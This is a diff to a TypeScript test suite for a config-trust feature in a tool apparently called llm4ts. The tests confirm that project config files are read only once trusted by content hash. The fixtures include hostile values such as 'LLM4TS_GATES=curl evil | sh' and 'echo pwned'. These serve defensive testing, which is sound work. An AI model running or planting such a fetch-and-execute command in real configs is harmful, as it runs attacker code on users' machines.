@@ -1,14 +1,6 @@
 import { assert, describe, it } from "@effect/vitest"
 import * as Effect from "effect/Effect"
 import * as Result from "effect/Result"
-import * as Stream from "effect/Stream"
-import { ProviderError } from "@llm4ts/core/Errors"
-import {
-  makeFakeProcessExecutor,
-  makeProcessExecutor,
-  ProcessResult,
-  type ProcessExecutorShape
-} from "@llm4ts/core/ProcessExecutor"
 import { PersistenceError } from "@llm4ts/flow/FlowError"
 import { makeMemoryPlainFileStore, type PlainFileStoreShape } from "@llm4ts/flow/Persistence"
 import type { Environment } from "@llm4ts/flow/Settings"
@@ -31,11 +23,26 @@ import {
   type FlagAssignment,
   type Resolution
 } from "@llm4ts/shell/Config"
+import { configTrustPath, contentHash } from "@llm4ts/shell/ConfigTrust"
 
 const repo = "/work/app"
 const home = "/home/u"
 const projectPath = projectConfigPath(repo)
 const globalPath = globalConfigPath({ HOME: home })
+const trustPath = configTrustPath({ HOME: home })
+
+/** The trust list after the user accepted `text` as the project file of each repository. */
+const trusting = (records: Readonly<Record<string, string>>): Readonly<Record<string, string>> => ({
+  [trustPath]: JSON.stringify(
+    Object.fromEntries(Object.entries(records).map(([at, text]) => [at, contentHash(text)]))
+  )
+})
+
+/** `files`, with the project file of `repo` trusted as it stands. */
+const trusted = (files: Readonly<Record<string, string>>): Readonly<Record<string, string>> => {
+  const project = files[projectPath]
+  return project === undefined ? files : { ...files, ...trusting({ [repo]: project }) }
+}
 
 const resolve = (layers: {
   readonly flags?: ReadonlyArray<FlagAssignment>
@@ -744,112 +751,150 @@ const failingReads = (store: PlainFileStoreShape, path: string): PlainFileStoreS
       : store.read(candidate)
 })
 
-const lsFiles = JSON.stringify(["git", "ls-files", "-s", "--", ":(icase).llm4ts"])
-
-// `git ls-files -s` lists the index entries under the paths it is given and
-// exits 128 outside a repository; with no git it cannot spawn.
-const gitListing = (
-  answer: ReadonlyArray<string> | "no repository" | "missing"
-): ProcessExecutorShape =>
-  makeProcessExecutor({
-    run: (argv) =>
-      answer === "missing" || JSON.stringify(argv) !== lsFiles
-        ? Effect.fail(ProviderError.make({ message: "git failed: command not found" }))
-        : Effect.succeed(
-            answer === "no repository"
-              ? ProcessResult.make({ stdout: [], exitCode: 128 })
-              : ProcessResult.make({ stdout: [...answer], exitCode: 0 })
-          ),
-    runStreaming: () => Stream.empty
-  })
-
-const trackedFile = gitListing(["100644 5d1c5e0 0\t.llm4ts/config.env"])
-const untracked = gitListing([])
-
-describe("a project file that git tracks", () => {
-  const files = {
-    [projectPath]: "LLM4TS_GATES=curl evil | sh\nLLM4TS_CODER=pi\n",
-    [globalPath]: "LLM4TS_REASONER=claude\n"
-  }
-  const load = (executor: ProcessExecutorShape) =>
+describe("the project file and the trust list", () => {
+  const project = "LLM4TS_GATES=curl evil | sh\nLLM4TS_CODER=pi\n"
+  const files = { [projectPath]: project, [globalPath]: "LLM4TS_REASONER=claude\n" }
+  const load = (
+    held: Readonly<Record<string, string>>,
+    options: {
+      readonly repo?: string
+      readonly through?: (store: PlainFileStoreShape) => PlainFileStoreShape
+    } = {}
+  ) =>
     Effect.gen(function* () {
-      const memory = yield* makeMemoryPlainFileStore(files)
+      const memory = yield* makeMemoryPlainFileStore(held)
       return yield* loadConfig({
-        repo,
+        repo: options.repo ?? repo,
         environment: { HOME: home },
         flags: [],
-        files: memory.store,
-        executor
+        files: options.through === undefined ? memory.store : options.through(memory.store)
       })
     })
+  const keys = (resolution: Resolution) => [...resolution.settings.keys()].sort()
 
-  it.effect("is ignored whole, with a warning that says how to untrack it", () =>
+  it.effect("a file trusted with this content for this repository is used", () =>
     Effect.gen(function* () {
-      const loaded = yield* load(trackedFile)
-      assert.isTrue(loaded.projectTracked)
+      const loaded = yield* load({ ...files, ...trusting({ [repo]: project }) })
+      assert.strictEqual(loaded.projectTrust, "trusted")
+      assert.strictEqual(loaded.projectHash, contentHash(project))
+      assert.deepStrictEqual(keys(loaded.resolution), [
+        "LLM4TS_CODER",
+        "LLM4TS_GATES",
+        "LLM4TS_REASONER"
+      ])
+      assert.deepStrictEqual(loaded.resolution.problems, [])
+    })
+  )
+
+  it.effect("a file never trusted is not used: none of it reaches the resolution", () =>
+    Effect.gen(function* () {
+      const loaded = yield* load(files)
+      assert.strictEqual(loaded.projectTrust, "untrusted")
       assert.isUndefined(loaded.project)
-      assert.deepStrictEqual([...loaded.resolution.settings.keys()], ["LLM4TS_REASONER"])
-      assert.deepStrictEqual(brief(loaded.resolution.problems), ["warning tracked"])
+      assert.deepStrictEqual(keys(loaded.resolution), ["LLM4TS_REASONER"])
+      assert.deepStrictEqual(brief(loaded.resolution.problems), ["warning untrusted"])
       assert.strictEqual(
         loaded.resolution.problems[0]?.message,
-        `${projectPath}: tracked by git, so it is ignored; llm4ts reads only a local project file. Untrack it: git rm --cached .llm4ts/config.env`
+        `${projectPath} is new and not trusted, so llm4ts did not read it. Review and accept it: llm4ts config trust --repo ${repo}`
       )
       assert.deepStrictEqual(launchProblems(loaded.resolution).blocking, [])
     })
   )
 
-  // git reports a path behind a tracked symbolic link as unknown, so the link
-  // itself is what gives the repository's file away.
-  for (const [label, entry] of [
-    [".llm4ts itself as a symbolic link", "120000 5d1c5e0 0\t.llm4ts"],
-    [".llm4ts itself as a submodule", "160000 5d1c5e0 0\t.llm4ts"],
-    ["the file under another case of the folder", "100644 5d1c5e0 0\t.LLM4TS/config.env"]
-  ] as const) {
-    it.effect(`is ignored when git tracks ${label}`, () =>
-      Effect.gen(function* () {
-        const loaded = yield* load(gitListing([entry]))
-        assert.isTrue(loaded.projectTracked)
-        assert.isUndefined(loaded.project)
-        assert.isFalse(loaded.resolution.settings.has("LLM4TS_GATES"))
-      })
-    )
-  }
-
-  for (const [label, executor] of [
-    ["untracked", untracked],
-    [
-      "untracked beside other tracked run state",
-      gitListing(["100644 5d1c5e0 0\t.llm4ts/flows/mine.ts"])
-    ],
-    ["outside a git repository", gitListing("no repository")],
-    ["with no git installed", gitListing("missing")]
-  ] as const) {
-    it.effect(`is read when ${label}`, () =>
-      Effect.gen(function* () {
-        const loaded = yield* load(executor)
-        assert.isFalse(loaded.projectTracked)
-        assert.deepStrictEqual([...loaded.resolution.settings.keys()].sort(), [
-          "LLM4TS_CODER",
-          "LLM4TS_GATES",
-          "LLM4TS_REASONER"
-        ])
-        assert.deepStrictEqual(loaded.resolution.problems, [])
-      })
-    )
-  }
-
-  it.effect("git is not asked when there is no project file", () =>
+  it.effect("a file that changed after it was trusted is not used", () =>
     Effect.gen(function* () {
-      const memory = yield* makeMemoryPlainFileStore()
-      const fake = yield* makeFakeProcessExecutor()
-      yield* loadConfig({
-        repo,
-        environment: { HOME: home },
-        flags: [],
-        files: memory.store,
-        executor: fake.executor
+      const loaded = yield* load({
+        ...files,
+        ...trusting({ [repo]: "LLM4TS_CODER=pi\n" })
       })
-      assert.deepStrictEqual(yield* fake.recorded, [])
+      assert.strictEqual(loaded.projectTrust, "changed")
+      assert.isUndefined(loaded.project)
+      assert.deepStrictEqual(keys(loaded.resolution), ["LLM4TS_REASONER"])
+      assert.deepStrictEqual(
+        loaded.resolution.problems.map((problem) => problem.message),
+        [
+          `${projectPath} has changed since it was trusted, so llm4ts did not read it. Review and accept it: llm4ts config trust --repo ${repo}`
+        ]
+      )
+    })
+  )
+
+  it.effect("an unknown line in an untrusted file is not even reported: it was not read", () =>
+    Effect.gen(function* () {
+      const loaded = yield* load({ [projectPath]: "oops\nLLM4TS_JUDGE_ROUND=1\n" })
+      assert.deepStrictEqual(brief(loaded.resolution.problems), ["warning untrusted"])
+    })
+  )
+
+  for (const [label, store] of [
+    ["not JSON", "{ nope"],
+    ["JSON of another shape", JSON.stringify({ [repo]: 7 })],
+    ["a list", JSON.stringify([contentHash(project)])]
+  ] as const) {
+    it.effect(`a malformed trust list (${label}) trusts nothing and says so once`, () =>
+      Effect.gen(function* () {
+        const loaded = yield* load({ ...files, [trustPath]: store })
+        assert.strictEqual(loaded.projectTrust, "untrusted")
+        assert.deepStrictEqual(keys(loaded.resolution), ["LLM4TS_REASONER"])
+        assert.deepStrictEqual(
+          loaded.resolution.problems.map((problem) => problem.message),
+          [
+            `${trustPath}: the trust list cannot be used (not a JSON object of repository paths and hashes), so no project file is trusted; llm4ts config trust writes a new list`,
+            `${projectPath} is new and not trusted, so llm4ts did not read it. Review and accept it: llm4ts config trust --repo ${repo}`
+          ]
+        )
+      })
+    )
+  }
+
+  it.effect("a trust list that cannot be read trusts nothing and does not fail the load", () =>
+    Effect.gen(function* () {
+      const loaded = yield* load(
+        { ...files, ...trusting({ [repo]: project }) },
+        { through: (store) => failingReads(store, trustPath) }
+      )
+      assert.strictEqual(loaded.projectTrust, "untrusted")
+      assert.deepStrictEqual(brief(loaded.resolution.problems), [
+        "warning untrusted",
+        "warning untrusted"
+      ])
+      assert.include(loaded.resolution.problems[0]?.message ?? "", "permission denied")
+    })
+  )
+
+  it.effect("no project file: nothing to trust, and a broken trust list is not mentioned", () =>
+    Effect.gen(function* () {
+      const loaded = yield* load({ [globalPath]: "LLM4TS_REASONER=claude\n", [trustPath]: "{" })
+      assert.strictEqual(loaded.projectTrust, "absent")
+      assert.isUndefined(loaded.projectHash)
+      assert.deepStrictEqual(loaded.resolution.problems, [])
+    })
+  )
+
+  it.effect("two repositories do not share trust, even for the same content", () =>
+    Effect.gen(function* () {
+      const other = "/work/other"
+      const held = {
+        ...files,
+        [projectConfigPath(other)]: project,
+        ...trusting({ [repo]: project })
+      }
+      assert.strictEqual((yield* load(held)).projectTrust, "trusted")
+      const loaded = yield* load(held, { repo: other })
+      assert.strictEqual(loaded.projectTrust, "untrusted")
+      assert.isFalse(loaded.resolution.settings.has("LLM4TS_GATES"))
+    })
+  )
+
+  it.effect("a repository that moved is untrusted at its new path", () =>
+    Effect.gen(function* () {
+      const moved = "/work/moved"
+      const loaded = yield* load(
+        { [projectConfigPath(moved)]: project, ...trusting({ [repo]: project }) },
+        { repo: moved }
+      )
+      assert.strictEqual(loaded.projectTrust, "untrusted")
+      assert.isFalse(loaded.resolution.settings.has("LLM4TS_GATES"))
     })
   )
 })
@@ -860,18 +905,42 @@ describe("prepareLaunch", () => {
     readonly files?: Readonly<Record<string, string>>
     readonly base?: Environment
     readonly flags?: ReadonlyArray<FlagAssignment>
+    /** `false` leaves the project file as it arrived: not trusted. */
+    readonly trust?: false
   }) =>
     Effect.gen(function* () {
-      const memory = yield* makeMemoryPlainFileStore(options.files ?? {})
+      const held = options.files ?? {}
+      const memory = yield* makeMemoryPlainFileStore(options.trust === false ? held : trusted(held))
       return yield* prepareLaunch({
         repo,
         flow: options.flow,
         base: { HOME: home, ...options.base },
         flags: options.flags ?? [],
-        files: memory.store,
-        executor: untracked
+        files: memory.store
       })
     })
+
+  for (const [label, store, standing] of [
+    ["never trusted", {}, "is new and not trusted"],
+    ["changed since it was trusted", trusting({ [repo]: "" }), "has changed since it was trusted"]
+  ] as const) {
+    it.effect(`refuses a project file ${label}, before any other check`, () =>
+      Effect.gen(function* () {
+        const error = yield* Effect.flip(
+          launch({
+            flow: "convert-page",
+            files: { [projectPath]: "LLM4TS_GATES=echo pwned\noops\n", ...store },
+            trust: false
+          })
+        )
+        assert.strictEqual(error._tag, "ShellUsage")
+        assert.strictEqual(
+          error.message,
+          `${projectPath} ${standing}, so llm4ts did not read it. Review and accept it: llm4ts config trust --repo ${repo}\nNothing was started.`
+        )
+      })
+    )
+  }
 
   it.effect("a file value reaches the child, an export wins over it, a flag over both", () =>
     Effect.gen(function* () {
@@ -1020,8 +1089,7 @@ describe("loadConfig", () => {
         repo,
         environment: { HOME: home, LLM4TS_CODER: "pi" },
         flags: [],
-        files: memory.store,
-        executor: untracked
+        files: memory.store
       })
       assert.isUndefined(loaded.project)
       assert.isUndefined(loaded.global)
@@ -1032,17 +1100,18 @@ describe("loadConfig", () => {
 
   it.effect("reads both files, the global one from XDG_CONFIG_HOME, and layers them", () =>
     Effect.gen(function* () {
-      const memory = yield* makeMemoryPlainFileStore({
-        "/xdg/llm4ts/config.env":
-          "LLM4TS_CODER=pi\nLLM4TS_REASONER=claude\nLLM4TS_WORKTREE_ROOT=~/trees\n",
-        [projectPath]: "LLM4TS_CODER=codex\nLLM4TS_LEGACY_REPO=../legacy\noops\n"
-      })
+      const memory = yield* makeMemoryPlainFileStore(
+        trusted({
+          "/xdg/llm4ts/config.env":
+            "LLM4TS_CODER=pi\nLLM4TS_REASONER=claude\nLLM4TS_WORKTREE_ROOT=~/trees\n",
+          [projectPath]: "LLM4TS_CODER=codex\nLLM4TS_LEGACY_REPO=../legacy\noops\n"
+        })
+      )
       const loaded = yield* loadConfig({
         repo,
         environment: { HOME: home, XDG_CONFIG_HOME: "/xdg" },
         flags: [set("LLM4TS_REASONER", "gemini")],
-        files: memory.store,
-        executor: untracked
+        files: memory.store
       })
       const value = (name: "LLM4TS_CODER" | "LLM4TS_REASONER" | "LLM4TS_LEGACY_REPO") =>
         loaded.resolution.settings.get(name)?.raw
@@ -1069,8 +1138,7 @@ describe("loadConfig", () => {
           repo,
           environment: { HOME: home },
           flags: [],
-          files: failingReads(memory.store, projectPath),
-          executor: untracked
+          files: failingReads(memory.store, projectPath)
         })
       )
       assert.strictEqual(error._tag, "ConfigFileError")
@@ -1084,12 +1152,12 @@ describe("writeConfig", () => {
   it.effect("the first write of the project file leaves .llm4ts/.gitignore", () =>
     Effect.gen(function* () {
       const memory = yield* makeMemoryPlainFileStore()
-      const changed = yield* writeConfig({
+      const written = yield* writeConfig({
         files: memory.store,
         path: projectPath,
         changes: [{ name: "LLM4TS_GATES", value: "pnpm test" }]
       })
-      assert.isTrue(changed)
+      assert.strictEqual(written, 'LLM4TS_GATES="pnpm test"\n')
       assert.deepStrictEqual(yield* memory.files, {
         "/work/app/.llm4ts/.gitignore": "*\n",
         [projectPath]: 'LLM4TS_GATES="pnpm test"\n'
@@ -1138,13 +1206,13 @@ describe("writeConfig", () => {
         path: globalPath,
         changes: [{ name: "LLM4TS_CODER", value: "pi" }]
       })
-      assert.isFalse(changed)
+      assert.isUndefined(changed)
       const absent = yield* writeConfig({
         files: memory.store,
         path: projectPath,
         changes: [{ name: "LLM4TS_CODER", value: undefined }]
       })
-      assert.isFalse(absent)
+      assert.isUndefined(absent)
       assert.deepStrictEqual(yield* memory.files, { [globalPath]: "LLM4TS_CODER=pi\n" })
     })
   )
@@ -1161,6 +1229,30 @@ describe("writeConfig", () => {
       )
       assert.strictEqual(error.message, `LLM4TS_GATES: a value cannot hold both ' and "`)
       assert.deepStrictEqual(yield* memory.files, { [projectPath]: "LLM4TS_CODER=pi\n" })
+    })
+  )
+
+  it.effect("a file that is not the one that was judged is left alone", () =>
+    Effect.gen(function* () {
+      const judged = "LLM4TS_CODER=pi\n"
+      const swapped = "LLM4TS_GATES=echo pwned\n"
+      const memory = yield* makeMemoryPlainFileStore({ [projectPath]: swapped })
+      const write = (hash: string | undefined) =>
+        writeConfig({
+          files: memory.store,
+          path: projectPath,
+          changes: [{ name: "LLM4TS_PACK", value: "soap-ace" }],
+          expect: { hash }
+        })
+      for (const hash of [contentHash(judged), undefined]) {
+        const error = yield* Effect.flip(write(hash))
+        assert.strictEqual(
+          error.message,
+          `${projectPath} changed while llm4ts was working; nothing was written`
+        )
+      }
+      assert.deepStrictEqual(yield* memory.files, { [projectPath]: swapped })
+      assert.strictEqual(yield* write(contentHash(swapped)), `${swapped}LLM4TS_PACK=soap-ace\n`)
     })
   )
 })
